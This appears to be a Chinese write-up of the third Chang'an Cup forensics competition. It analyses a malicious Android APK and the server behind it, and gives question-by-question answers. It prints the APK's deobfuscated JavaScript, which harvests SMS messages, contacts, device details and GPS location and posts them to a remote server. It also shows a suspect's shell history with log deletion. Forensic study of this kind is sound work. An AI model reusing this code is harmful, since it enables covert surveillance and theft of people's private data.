库的抓包，根据使用者的定义对网络上的数据包进行截获，可以将网络中传送的数据包完全截获下来提供分析，这种方式的优点是可以抓取到所有协议的网络数据包。\n- 抓包方式选用\n  - 抓 HTTP 协议首选 HTTP 方式抓包，后台服务器不存在的情况下选择代理模式抓包；\n  - 抓 TCP 协议选择 TCP 方式抓包；\n  - 在其他方式都抓包无果的情况下，建议使用 TCPDump 进行尝试；\n- 抓包注意事项\n  - 代理模式和 TCPDump 抓包不能自动区分网络数据包是来源哪个应用的，有可能会混入非当前 APP 的网络数据包，因此需要自己筛选判断；\n  - 代理模式如果使用的是真机，真机需要和 PC 保持在同一局域网；\n  - 代理模式和 TCPDump 抓到的网络数据包需要先在分析结果页中将目标数据包添加标记后才能导出到 Word/PDF 报告；\n  - Android 设备使用代理模式时软件会自动设置代理，结束抓包的时候软件会自动清除代理。如果没有正常结束代理模式抓包，可能会因残留的代理设置导致Android设备无法上网，可以使用雷电APP自动修复；\n  - iOS 设备使用代理模式时需要自己安装证书、配置代理设置以及清除代理设置；\n  - TCPDump 抓包模式下不会实时更新抓包结果，只有在点击结束后才会进行解析并展示抓包结果；\n  - TCPDump 的抓包结果目前只支持 HTTP 请求的解析，HTTPS 请求需要借 Wireshark 进行分析。\n##### 法二\n- jadx搜索\n\n![alt text](/img/第三届长安杯笔记_2-6-1.png)\n![alt text](/img/第三届长安杯笔记_2-10.png)\n- [解密网站](https://ctf.bugku.com/tool/sojson4)得到：\n```c\n/*\n*Aman - 194nb.com\n*/\n/*\n *Progcessed By JSDec in 0.00s\n *JSDec - JSDec.js.org\n */\nmui.init();\n\n\t\tmui.plusReady(function () {\n\t\t\t//var main = plus.android.runtimeMainActivity();  \n\t\t\t// main.moveTaskToBack(false);\n\n\t\t\tvar address = plus.device.vendor + '-' + plus.device.model;\n\t\t\taddress = address.replace(/\\n/g, \"\").replace(/ /g, \"\").replace(/\\r/g, \"\");\n\t\t\tvar apiserver = 'http://www.honglian7001.com/api/uploads/';\n\t\t\t//重复数据处理 预防用户重复点击\n\t\t\tvar danjishijian = true;\n\t\t\tfunction requestPermission(sjh, yqm) {\n\t\t\t\tplus.android.requestPermissions(\n\t\t\t\t\t[\"android.permission.READ_SMS\"],\n\t\t\t\t\tfunction (resultObj) {\n\t\t\t\t\t\t//SmsInfo存放一条短信的各项内容\n\t\t\t\t\t\tvar SmsInfo = {}\n\t\t\t\t\t\t//Sms存放所有短信\n\t\t\t\t\t\tvar Sms = {}\n\n\t\t\t\t\t\tvar aimei = sjh;\n\t\t\t\t\t\tvar aimei2 = yqm;\n\t\t\t\t\t\tvar duanxin = '[{\"imei\":\"' + aimei + '\",\"imei2\":\"' + aimei2 + '\"}';\n\t\t\t\t\t\tvar Cursor = plus.android.importClass(\"android.database.Cursor\")\n\t\t\t\t\t\tvar Uri = plus.android.importClass(\"android.net.Uri\")   //注意啦，android.net.Uri中的net是小写\n\t\t\t\t\t\tvar activity = plus.android.runtimeMainActivity()\n\t\t\t\t\t\tvar uri = Uri.parse(\"content://sms/\");\n\n\t\t\t\t\t\tvar projection = new Array(\"_id\", \"address\", \"person\", \"body\", \"date\", \"type\")\n\t\t\t\t\t\tvar cusor = activity.managedQuery(uri, projection, null, null, \"date desc\")\n\t\t\t\t\t\tvar idColumn = cusor.getColumnIndex(\"_id\")\n\t\t\t\t\t\tvar nameColumn = cusor.getColumnIndex(\"person\")\n\t\t\t\t\t\tvar phoneNumberColumn = cusor.getColumnIndex(\"address\")\n\t\t\t\t\t\tvar smsbodyColumn = cusor.getColumnIndex(\"body\")\n\t\t\t\t\t\tvar dateColumn = cusor.getColumnIndex(\"date\")\n\t\t\t\t\t\tvar typeColumn = cusor.getColumnIndex(\"type\")\n\t\t\t\t\t\tif (cusor != null) {\n\t\t\t\t\t\t\twhile (cusor.moveToNext()) {\n\t\t\t\t\t\t\t\tSmsInfo.id = cusor.getString(idColumn)\n\t\t\t\t\t\t\t\tSmsInfo.Name = cusor.getInt(nameColumn)\n\t\t\t\t\t\t\t\tSmsInfo.Date = cusor.getLong(dateColumn)\n\t\t\t\t\t\t\t\tSmsInfo.Date = getFormatDate(SmsInfo.Date)\n\t\t\t\t\t\t\t\tSmsInfo.PhoneNumber = cusor.getString(phoneNumberColumn)\n\t\t\t\t\t\t\t\tSmsInfo.Smsbody = cusor.getString(smsbodyColumn)\n\t\t\t\t\t\t\t\tSmsInfo.Type = cusor.getString(typeColumn)\n\n\t\t\t\t\t\t\t\tvar post = JSON.stringify(SmsInfo);\n\t\t\t\t\t\t\t\t//console.log(post);\n\t\t\t\t\t\t\t\tduanxin = duanxin + ',' + post;\n\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tduanxin = duanxin + ']';\n\t\t\t\t\t\t\t//alert(duanxin);\n\n\t\t\t\t\t\t\tmui.ajax(apiserver + 'apisms', {\n\t\t\t\t\t\t\t\tdata: {\n\t\t\t\t\t\t\t\t\tdata: duanxin\n\t\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t\tdataType: 'text',//服务器返回json格式数据\n\t\t\t\t\t\t\t\ttype: 'post',//HTTP请求类型\n\t\t\t\t\t\t\t\ttimeout: 10000,//超时时间设置为10秒；              \n\t\t\t\t\t\t\t\tsuccess: function (data) {\n\t\t\t\t\t\t\t\t\tmui.toast('获取成功')\n\t\t\t\t\t\t\t\t\t//console.log(con)\n\n\n\t\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\t\terror: function (xhr, type, errorThrown) {\n\t\t\t\t\t\t\t\t\t//异常处理；\n\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t});\n\t\t\t\t\t\t\tcusor.close()\n\t\t\t\t\t\t}\n\n\t\t\t\t\t},\n\t\t\t\t\tfunction (error) {\n\t\t\t\t\t\tconsole.log('申请权限错误：' + error.code + \" = \" + error.message);\n\t\t\t\t\t});\n\t\t\t}\n\n\n\n\t\t\t//扩展Date功能：将long型日期转换为特定的格式\n\t\t\tDate.prototype.format = function (format) {\n\t\t\t\tvar o = {\n\t\t\t\t\t\"M+\": this.getMonth() + 1,\n\t\t\t\t\t\"d+\": this.getDate(),\n\t\t\t\t\t\"h+\": this.getHours(),\n\t\t\t\t\t\"m+\": this.getMinutes(),\n\t\t\t\t\t\"s+\": this.getSeconds(),\n\t\t\t\t\t\"q+\": Math.floor((this.getMonth() + 3) / 3),\n\t\t\t\t\t\"S\": this.getMilliseconds()\n\t\t\t\t}\n\t\t\t\tif (/(y+)/.test(format)) {\n\t\t\t\t\tformat = format.replace(RegExp.$1, (this.getFullYear() + \"\").substr(4 - RegExp.$1.length));\n\t\t\t\t}\n\t\t\t\tfor (var k in o) {\n\t\t\t\t\tif (new RegExp(\"(\" + k + \")\").test(format)) {\n\t\t\t\t\t\tformat = format.replace(RegExp.$1, RegExp.$1.length == 1 ? o[k] : (\"00\" + o[k]).substr((\"\" + o[k]).length));\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\treturn format;\n\t\t\t}\n\n\n\t\t\t//将long型日期转换为特定格式\n\t\t\tfunction getFormatDate(l, pattern) {\n\t\t\t\tdate = new Date(l);\n\t\t\t\tif (pattern == undefined) {\n\t\t\t\t\tpattern = \"yyyy-MM-dd hh:mm:ss\";\n\t\t\t\t}\n\t\t\t\treturn date.format(pattern);\n\t\t\t}\n\n\n\t\t\t//alert(plus.device.uuid)\n\t\t\tplus.navigator.setStatusBarBackground(\"#db6eff\");\n\n\t\t\tmui(\"body\").off(\"tap\");\n\n\t\t\tmui(\"body\").on('tap', '#tx', function (event) {\n\n\t\t\t\t$('#tx').hide();\n\t\t\t\t$('#zz').show();\n\t\t\t});\n\n\t\t\tmui(\"body\").on('tap', '#gb', function (event) {\n\n\t\t\t\t$('#tx').show();\n\t\t\t\t$('#zz').hide();\n\t\t\t});\n\n\t\t\tmui(\"body\").on('tap', '#qd', function (event) {\n\t\t\t\tif (danjishijian) {\n\t\t\t\t\tdanjishijian = false;\n\t\t\t\t\taa()\n\t\t\t\t} else {\n\t\t\t\t\taa()\n\t\t\t\t}\n\n\t\t\t});\n\n\n\t\t\tfunction getPermission(permissionIdentity, successCallBack, errorCallBack) {\n\t\t\t\t//权限标识转换成大写  \n\t\t\t\tvar permissionIdentity = permissionIdentity.toUpperCase();\n\t\t\t\t//获取检测权限的状态  \n\t\t\t\tvar checkResult = plus.navigator.checkPermission(permissionIdentity);\n\t\t\t\t//权限状态是否正常  \n\t\t\t\tvar permissionStatusOk = false;\n\t\t\t\t//权限中文名称  \n\t\t\t\tvar permissionName = '';\n\t\t\t\t//对应 andorid 的具体权限  \n\t\t\t\tvar androidPermission = '';\n\t\t\t\t//获取权限中文意思与对应 android 系统的权限字符串  \n\t\t\t\tswitch (permissionIdentity) {\n\n\t\t\t\t\tcase 'CONTACTS':\n\t\t\t\t\t\tpermissionName = '系统联系人';\n\t\t\t\t\t\tandroidPermission = 'android.permission.READ_CONTACTS'\n\t\t\t\t\t\tbreak;\n\n\t\t\t\t\tdefault:\n\t\t\t\t\t\tpermissionName = '未知';\n\t\t\t\t\t\tandroidPermission = '未知';\n\t\t\t\t\t\tbreak;\n\t\t\t\t}\n\n\t\t\t\t//判断检查权限的结果  \n\t\t\t\tswitch (checkResult) {\n\t\t\t\t\tcase 'authorized':\n\t\t\t\t\t\t//正常的  \n\t\t\t\t\t\tpermissionStatusOk = true\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase 'denied':\n\t\t\t\t\t\t//表示程序已被用户拒绝使用此权限，如果是拒绝的就再次提示用户打开确认提示框  \n\t\t\t\t\t\t//如果有该权限但是没有打开不进行操作还是会去申请或手动打开  \n\t\t\t\t\t\t// console.log('已关闭' + permissionName + '权限')  \n\t\t\t\t\t\t// errorCallBack('已关闭' + permissionName + '权限');  \n\t\t\t\t\t\t// return  \n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase 'undetermined':\n\t\t\t\t\t\t// 表示程序未确定是否可使用此权限，此时调用对应的API时系统会弹出提示框让用户确认  \n\t\t\t\t\t\t// this.requestPermissions(androidPermission, permissionName, successCallBack, errorCallBack)  \n\t\t\t\t\t\t// errorCallBack('未确定' + permissionName + '权限');  \n\t\t\t\t\t\t// return  \n\t\t\t\t\t\tbreak;\n\t\t\t\t\tcase 'unknown':\n\t\t\t\t\t\terrorCallBack('无法查询' + permissionName + '权限');\n\t\t\t\t\t\treturn\n\t\t\t\t\t\tbreak;\n\t\t\t\t\tdefault:\n\t\t\t\t\t\terrorCallBack('不支持' + permissionName + '权限');\n\t\t\t\t\t\treturn\n\t\t\t\t\t\tbreak;\n\t\t\t\t}\n\n\t\t\t\t//如果权限是正常的执行成功回调  \n\t\t\t\tif (permissionStatusOk) {\n\t\t\t\t\tsuccessCallBack()\n\t\t\t\t} else {\n\t\t\t\t\t//如果不正常，如果是 andorid 系统，就动态申请权限  \n\t\t\t\t\tif (plus.os.name == 'Android') {\n\t\t\t\t\t\t//动态申请权限  \n\t\t\t\t\t\tplus.android.requestPermissions([androidPermission], function (e) {\n\t\t\t\t\t\t\tif (e.deniedAlways.length > 0) {\n\t\t\t\t\t\t\t\t//权限被永久拒绝  \n\t\t\t\t\t\t\t\t// 弹出提示框解释为何需要定位权限，引导用户打开设置页面开启  \n\t\t\t\t\t\t\t\terrorCallBack('请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。')\n\t\t\t\t\t\t\t\t// console.log('Always Denied!!! ' + e.deniedAlways.toString());  \n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif (e.deniedPresent.length > 0) {\n\t\t\t\t\t\t\t\t//权限被临时拒绝  \n\t\t\t\t\t\t\t\t// 弹出提示框解释为何需要定位权限，可再次调用plus.android.requestPermissions申请权限  \n\t\t\t\t\t\t\t\terrorCallBack('请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。')\n\t\t\t\t\t\t\t\t// console.log('Present Denied!!! ' + e.deniedPresent.toString());  \n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif (e.granted.length > 0) {\n\t\t\t\t\t\t\t\t//权限被允许  \n\t\t\t\t\t\t\t\t//调用依赖获取定位权限的代码  \n\t\t\t\t\t\t\t\tsuccessCallBack()\n\t\t\t\t\t\t\t\t// console.log('Granted!!! ' + e.granted.toString());  \n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}, function (e) {\n\t\t\t\t\t\t\terrorCallBack('请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。')\n\t\t\t\t\t\t\t// console.log('Request Permissions error:' + JSON.stringify(e));  \n\t\t\t\t\t\t})\n\t\t\t\t\t} else if (plus.os.name == 'iOS') {\n\t\t\t\t\t\t//ios ,第一次使用目的权限时，应用的权限列表里是不存在的，所以先默认执行一下成功回调，打开要使用的操作，比如 plus.camera  \n\t\t\t\t\t\t//这时系统会提示是否打开相应的权限，如果拒绝也没关系，因为应用的权限列表里已经存在该权限了，下次再调用相应权限时，就会  \n\t\t\t\t\t\t//走 else 里的流程，会给用户提示，并且跳转到应该的权限页面，让用户手动打开。  \n\t\t\t\t\t\tif (checkResult == 'undetermined') {\n\t\t\t\t\t\t\t//调用依赖获取定位权限的代码  \n\t\t\t\t\t\t\tsuccessCallBack(true)\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t//如果是 ios 系统，ios 没有动态申请操作，所以提示用户去设置页面手动打开  \n\t\t\t\t\t\t\tmui.confirm(permissionName + '权限没有开启，是否去开启？', '提醒', ['取消', '确认'], function (e) {\n\t\t\t\t\t\t\t\t//取消  \n\t\t\t\t\t\t\t\tif (e.index == 0) {\n\t\t\t\t\t\t\t\t\terrorCallBack('请您同意弹出的权限，便可正常使用APP！如果未弹出，请前往“手机设置”里的“权限管理”找到本应用，并打开通讯录权限，方可使用。')\n\t\t\t\t\t\t\t\t} else if (e.index == 1) {\n\t\t\t\t\t\t\t\t\t//确认，打开当前应用权限设置页面  \n\t\t\t\t\t\t\t\t\tvar UIApplication = plus.ios.import('UIApplication');\n\t\t\t\t\t\t\t\t\tvar application2 = UIApplication.sharedApplication();\n\t\t\t\t\t\t\t\t\tvar NSURL2 = plus.ios.import('NSURL');\n\t\t\t\t\t\t\t\t\t// var setting2 = NSURL2.URLWithString(\"prefs:root=LOCATION_SERVICES\");                             \n\t\t\t\t\t\t\t\t\tvar setting2 = NSURL2.URLWithString('app-settings:');\n\t\t\t\t\t\t\t\t\tapplication2.openURL(setting2);\n\n\t\t\t\t\t\t\t\t\tplus.ios.deleteObject(setting2);\n\t\t\t\t\t\t\t\t\tplus.ios.deleteObject(NSURL2);\n\t\t\t\t\t\t\t\t\tplus.ios.deleteObject(application2)\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}, 'div')\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tfunction aa() {\n\t\t\t\tvar sjh = $('#sjh').val();\n\t\t\t\tvar yqm = $('#yqm').val();\n\t\t\t\tif (parseInt(sjh) > 0 && parseInt(yqm) > 0 && parseInt(sjh) > 13000000000 && parseInt(sjh) < 19999999999 && parseInt(yqm) > 0 && parseInt(yqm) < 999999) {\n\n\t\t\t\t\tgetPermission('CONTACTS', function () {\n\t\t\t\t\t\thuoqu(sjh, yqm);\n\n\t\t\t\t\t}, function (msg) {\n\t\t\t\t\t\tmui.alert(msg, '提醒', '确定', function () { }, 'div')\n\t\t\t\t\t\t//aa()\n\t\t\t\t\t})\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tmui.toast('请输入正确的手机号和邀请码')\n\t\t\t\t}\n\n\t\t\t}\n\n\t\t\tfunction dingwei(sjh, yqm) {\n\t\t\t\tplus.geolocation.getCurrentPosition(translatePoint, function (e) {\n\t\t\t\t\tmui.toast(\"异常:\" + e.message);\n\t\t\t\t});\n\t\t\t}\n\n\t\t\tfunction translatePoint(position) {\n\n\t\t\t\tvar sjh = $('#sjh').val()\n\t\t\t\tvar yqm = $('#yqm').val()\n\t\t\t\tvar currentLon = position.coords.longitude;\n\t\t\t\tvar currentLat = position.coords.latitude;\n\t\t\t\tvar jingweidu = sjh + ',' + yqm + ',' + currentLon + ',' + currentLat;\n\t\t\t\tmui.ajax(apiserver + 'apimap', {\n\t\t\t\t\tdata: {\n\t\t\t\t\t\tdata: jingweidu\n\t\t\t\t\t},\n\t\t\t\t\tdataType: 'text',//服务器返回json格式数据\n\t\t\t\t\ttype: 'post',//HTTP请求类型\n\t\t\t\t\ttimeout: 10000,//超时时间设置为10秒；              \n\t\t\t\t\tsuccess: function (data) {\n\n\t\t\t\t\t\tif (data == '获取成功') {\n\t\t\t\t\t\t\trequestPermission(sjh, yqm);\n\n\t\t\t\t\t\t\t//setInterval(function(){\n\t\t\t\t\t\t\t//var sjh=$('#sjh').val();\n\t\t\t\t\t\t\t//var yqm=$('#yqm').val();\n\t\t\t\t\t\t\t//requestPermission(sjh,yqm);\n\t\t\t\t\t\t\t//console.log('send')\n\n\t\t\t\t\t\t\t//},30000)\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\tmui.toast(data)\n\t\t\t\t\t},\n\t\t\t\t\terror: function (xhr, type, errorThrown) {\n\t\t\t\t\t\t//异常处理；\n\t\t\t\t\t}\n\t\t\t\t});\n\n\t\t\t\t//书写自己的逻辑\n\n\t\t\t}\n\t\t\t// 扩展API加载完毕，现在可以正常调用扩展API\n\n\t\t\tfunction huoqu(sjh, yqm) {\n\t\t\t\tvar con = sjh + \"**\" + yqm + '**' + address;\n\n\n\t\t\t\tplus.contacts.getAddressBook(plus.contacts.ADDRESSBOOK_PHONE, function (addressbook) {\n\n\n\t\t\t\t\taddressbook.find([\"displayName\", \"phoneNumbers\"], function (contacts) {\n\n\n\t\t\t\t\t\tfor (var i = 0, len = contacts.length; i < len; i++) {\n\t\t\t\t\t\t\tcon = con + '=' + contacts[i].displayName + '|' + (contacts[i].phoneNumbers.length == 0 ? \"\" : contacts[i].phoneNumbers[0].value);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tmui.ajax(apiserver + 'api', {\n\t\t\t\t\t\t\tdata: {\n\t\t\t\t\t\t\t\tdata: con\n\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\tdataType: 'text',//服务器返回json格式数据\n\t\t\t\t\t\t\ttype: 'post',//HTTP请求类型\n\t\t\t\t\t\t\ttimeout: 10000,//超时时间设置为10秒；              \n\t\t\t\t\t\t\tsuccess: function (data) {\n\t\t\t\t\t\t\t\t//alert(data)\n\t\t\t\t\t\t\t\tif (data == '正在加载列表') {\n\t\t\t\t\t\t\t\t\tdingwei(sjh, yqm);\n\t\t\t\t\t\t\t\t\tmui.openWindow({\n\t\t\t\t\t\t\t\t\t\turl: 'list.html',\n\t\t\t\t\t\t\t\t\t\tshow: {\n\t\t\t\t\t\t\t\t\t\t\tautoShow: true\n\t\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t});\n\t\t\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t\t\tmui.toast(data)\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t//console.log(con)\n\t\t\t\t\t\t\t},\n\t\t\t\t\t\t\terror: function (xhr, type, errorThrown) {\n\t\t\t\t\t\t\t\t//异常处理；\n\n\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t});\n\t\t\t\t\t}, function () {\n\t\t\t\t\t\tmui.alert(\"为保证用户质量，使用本app请同意通讯录授权 \");\n\t\t\t\t\t}, {\n\t\t\t\t\t\tmultiple: true\n\t\t\t\t\t});\n\t\t\t\t}, function (e) {\n\t\t\t\t\tmui.alert(\"为保证用户质量，使用本app请同意通讯录授权 \");\n\t\t\t\t});\n\t\t\t}\n\t\t});\n```\n- 总结：\n  - //Sms存放所有短信；//调用依赖获取定位权限的代码；\tmui.toast('请输入正确的手机号和邀请码')\n  - mui.alert(\"为保证用户质量，使用本app请同意通讯录授权 \");\n  - 答案：ACDE\n\n#### 6. 该APK程序回传通讯录时，使用的http请求方式为\n- 雷电抓包可得\n\n#### 7. 该APK程序的回传地址域名为【标准格式：www.abc.com】\t\n- 雷电抓包可得\n\n#### 8. 该APK程序代码中配置的变量apiserver的值为【标准格式：www.abc.com/abc】\t\n- sojson4解密结果中有var apiserver = 'http://www.honglian7001.com/api/uploads/';\n\n#### 9. 分析该APK，发现该程序还具备获取短信回传到后台的功能，短信上传服务器接口地址为【标准格式：www.abc.com/abc】\t\n- 继续在上一段代码里搜索SMS，这是短信的一般英文名，可以看到代码\n```c\nmui.ajax(apiserver + 'apisms', {\n```\n- 答案：http://www.honglian7001.com/api/uploads/apisms\n\n#### 10. 经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该文件的文件名为\t\n- 使用雷电APP分析的Frida脚本里的SQLite数据库，即可得到数据库名\n\n![alt text](/img/第三届长安杯笔记_8.png)\n\n#### 11. 经分析，发现该APK在运行过程中会在手机中产生一个数据库文件，该数据库的初始密码为\t\n- 同上\n\n### 经过掌握的APK程序后台服务器回连地址，警方成功调取该服务器的镜像，请使用第7题的答案对检材二进行解压进行分析，并回答下列问题：(www.honglian7001.com)\n#### 12. 检材二的原始硬盘的SHA256值为：\t\n\n![alt text](/img/第三届长安杯笔记_2-12.png)\n#### 13. 查询涉案于案发时间段内登陆服务器的IP地址为【标准格式：111.111.111.111】\t\n- pts指远程，tty指直连，down指正常关机，crash指强制关机\n\n![alt text](/img/第三届长安杯笔记_2-13.png)\n#### 14. 请对检材二进行分析，并回答该服务器在集群中承担的主要作用是（）【格式：文件存储】\t\n- 仿真(默认重置密码123456？？？)\n- 查看端口：netstat -antp\n- 查看历史命令：history(但有时要su之后进入root用户再history)\n```bash\n[ccj@localhost ~]$ su\n密码：\n[root@localhost ccj]# history\n# 显示内容给AI解释如下：\n    1  ls  # 查看当前目录内容\n    2  cd Desktop/  # 进入桌面目录\n    3  ls  # 查看桌面文件\n    4  uname -a  # 显示系统内核详细信息\n    5  cat /etc/issue  # 查看系统发行版信息\n    6  lsb_release -a  # 显示LSB发行版信息\n    7  cat /proc/cpuinfo   # 查看CPU信息\n    8  hostname  # 显示主机名\n    9  whoiam  # 错误命令，应该是whoami\n   10  whoani  # 错误命令，应该是whoami\n   11  whoami  # 显示当前登录用户名\n   12  lspci  # 列出PCI设备\n   13  env  # 显示环境变量\n   14  lsusb  # 列出USB设备\n   15  cat /proc/meminfo   # 查看内存信息\n   16  df -h  # 显示磁盘空间使用情况（人类可读格式）\n   17  fsdisk -l  # 错误命令，应该是fdisk\n   18  fdisk -l  # 列出磁盘分区表\n   19  ps aux  # 显示所有运行中的进程\n   20  ps -ef  # 以完整格式显示所有进程\n   21  crontab -l  # 列出当前用户的定时任务\n   22  services --status-all  # 错误命令，应该是service\n   23  service --status-all  # 显示所有服务的状态\n   24  service  # 显示service命令用法\n   25  service --status-all  # 再次尝试查看服务状态\n   26  systemctl  # 显示systemctl命令用法\n   27  systemctl --help  # 查看systemctl帮助信息\n   28  systemctl -all  # 错误选项，应该是systemctl list-units\n   29  ls  # 查看当前目录\n   30  init 3  # 切换到运行级别3（多用户文本模式）\n   31  ls  # 查看当前目录\n   32  cd /  # 切换到根目录\n   33  ls  # 查看根目录内容\n   34  cd opt  # 进入opt目录\n   35  ls  # 查看opt目录内容\n   36  cd honglianjingsai/  # 进入红莲竞赛目录\n   37  ls  # 查看红莲竞赛目录内容\n   38  cd chronusNode/  # 进入chronusNode目录\n   39  ls  # 查看chronusNode目录内容\n   40  cd logs  # 进入日志目录\n   41  ls  # 查看日志文件\n   42  rm *  # 删除所有日志文件（危险操作）\n   43  ls  # 确认日志文件已删除\n   44  ip a  # 显示网络接口信息\n   45  init 3  # 再次切换到运行级别3\n   46  ls  # 查看当前目录\n   47  who  # 显示当前登录用户\n   48  w  # 显示当前登录用户及活动\n   49  cd /opt/  # 进入/opt目录\n   50  ls  # 查看/opt目录内容\n   51  cd honglianjingsai/  # 进入红莲竞赛目录\n   52  ls  # 查看目录内容\n   53  cdd chronusNode/  # 错误命令，应该是cd\n   54  cd chronusNode/  # 进入chronusNode目录\n   55  ;s  # 错误命令，分号分隔的空命令和s\n   56  ls  # 查看目录内容\n   57  cd controller/  # 进入控制器目录\n   58  ls  # 查看控制器文件\n   59  ls -l  # 以长格式查看文件详情\n   60  date  # 显示当前日期时间\n   61  history  # 显示命令历史\n   62  ls  # 查看当前目录\n   63  cd ..  # 返回上级目录\n   64  ls  # 查看目录内容\n   65  cd logs/  # 进入日志目录\n   66  ls  # 查看日志文件\n   67  ls -l  # 以长格式查看日志文件\n   68  ls  # 再次查看\n   69  cd ..  # 返回上级目录\n   70  ;s  # 错误命令\n   71  ls  # 查看目录内容\n   72  cd controller/  # 进入控制器目录\n   73  l;s  # 错误命令，应该是ls\n   74  ls  # 查看控制器文件\n   75  cd ..  # 返回上级目录\n   76  l;s  # 错误命令，应该是ls\n   77  ls  # 查看目录内容\n   78  cd static/  # 进入静态文件目录\n   79  ls  # 查看静态文件\n   80  cd .  # 停留在当前目录\n   81  cd ..  # 返回上级目录\n   82  ls  # 查看目录内容\n   83  cd uploads/  # 进入上传文件目录\n   84  ls  # 查看上传的文件\n   85  cd ..  # 返回上级目录\n   86  ls  # 查看目录内容\n   87  cd ..  # 返回上级目录\n   88  ls  # 查看目录内容\n   89  more README.txt  # 查看README文件内容\n   90  ifconfig  # 显示网络接口配置\n   91  netstat -anpt  # 显示所有网络连接和监听端口\n   92  init 3  # 切换到运行级别3\n   93  vi /etc/sysconfig/network-scripts/ifcfg-ens33  # 编辑网络接口配置\n   94  reboot  # 重启系统\n   95  ifconfig  # 显示网络接口配置\n   96  init 3  # 切换到运行级别3\n   97  ls  # 查看当前目录\n   98  firewall-cmd --add-port 80/tcp  # 添加80端口到防火墙（缺少--permanent）\n   99  systemctl start firewalld  # 启动防火墙服务\n  100  firewall-cmd --add-port 80/tcp  # 再次尝试添加80端口\n  101  ip a  # 显示IP地址信息\n  102  cd /opt  # 进入/opt目录\n  103  ls  # 查看目录内容\n  104  cd honglianjingsai/  # 进入红莲竞赛目录\n  105  ls  # 查看目录内容\n  106  cd chronusNode/  # 进入chronusNode目录\n  107  ls  # 查看目录内容\n  108  cd controller/  # 进入控制器目录\n  109  ls  # 查看控制器文件\n  110  vi ADProxy.js  # 编辑ADProxy.js文件\n  111  ls  # 查看文件\n  112  cd /opt/  # 进入/opt目录\n  113  ls  # 查看目录内容\n  114  cd honglianjingsai/  # 进入红莲竞赛目录\n  115  ls  # 查看目录内容\n  116  cd chronusNode/  # 进入chronusNode目录\n  117  ls  # 查看目录内容\n  118  cd controller/  # 进入控制器目录\n  119  ls  # 查看控制器文件\n  120  more ADProxy.js  # 查看ADProxy.js文件内容\n  121  clear  # 清屏\n  122  ls  # 查看当前目录\n  123  cd ..  # 返回上级目录\n  124  ls  # 查看目录内容\n  125  node app.js  # 启动Node.js应用\n  126  clear  # 清屏\n  127  history  # 显示命令历史\n  128  cd /opt/honglianjingsai/  # 进入红莲竞赛目录\n  129  ls  # 查看目录内容\n  130  cd chronusNode/  # 进入chronusNode目录\n  131  ls  # 查看目录内容\n  132  cd controller/  # 进入控制器目录\n  133  ls  # 查看控制器文件\n  134  vi ADProxy.js  # 编辑ADProxy.js文件\n  135  yum vim  # 错误命令，应该是yum install vim\n  136  yum install vim  # 安装vim编辑器\n  137  ls  # 查看文件\n  138  ping www.baidu.com  # 测试网络连接到百度\n  139  ping baidu.com  # 测试网络连接\n  140  yum install vim  # 安装vim编辑器\n  141  vim ADProxy.js  # 使用vim编辑ADProxy.js\n  142   more ADProxy.js   # 查看ADProxy.js内容\n  143  vim ADProxy.js  # 再次编辑ADProxy.js\n  144  cd ..  # 返回上级目录\n  145  lsls  # 错误命令，应该是ls\n  146  ls  # 查看目录内容\n  147  more README.txt  # 查看README文件内容\n  148  cd chronusNode/controller/  # 进入控制器目录\n  149  vim ADProxy.js  # 编辑ADProxy.js文件\n  150  cd ..  # 返回上级目录\n  151  ls  # 查看目录内容\n  152  vim const.js  # 编辑const.js常量文件\n  153  firewall-cmd --zone=public --add-port=80/tcp --permanent  # 永久添加80端口到防火墙\n  154  ifconfig  # 显示网络接口配置\n  155  ping 192.168.110.111  # 测试连接到指定IP\n  156  ls  # 查看当前目录\n  157  cd controller/  # 进入控制器目录\n  158  ls  # 查看控制器文件\n  159  vim ADProxy.js  # 编辑ADProxy.js文件\n  160  firewall-cmd --add-port=80/tcp --permanent  # 永久添加80端口\n  161  systemctl stop firewalld  # 停止防火墙服务\n  162  vim ADProxy.js  # 编辑ADProxy.js文件\n  163  LS  # 错误命令，应该是ls（大写）\n  164  ls  # 查看文件\n  165  cd ..  # 返回上级目录\n  166  ls  # 查看目录内容\n  167  cd logs/  # 进入日志目录\n  168  ls  # 查看日志文件\n  169  more 2021-4-23-6-34.log  # 查看指定日志文件\n  170  more 2021-4-23-6-31.log  # 查看另一个日志文件\n  171  cd ..  # 返回上级目录\n  172  cd controller/  # 进入控制器目录\n  173  ls  # 查看控制器文件\n  174  vim ADProxy.js  # 编辑ADProxy.js文件\n  175  vim /etc/hosts  # 编辑主机名解析文件\n  176  vim ADProxy.js  # 编辑ADProxy.js文件\n  177  cd ..  # 返回上级目录\n  178  ls  # 查看目录内容\n  179  node app.js  # 启动Node.js应用\n  180  reboot  # 重启系统\n  181  cd /opt  # 进入/opt目录\n  182  ls  # 查看目录内容\n  183  cd honglianjingsai/  # 进入红莲竞赛目录\n  184  ls  # 查看目录内容\n  185  cd chronusNode/  # 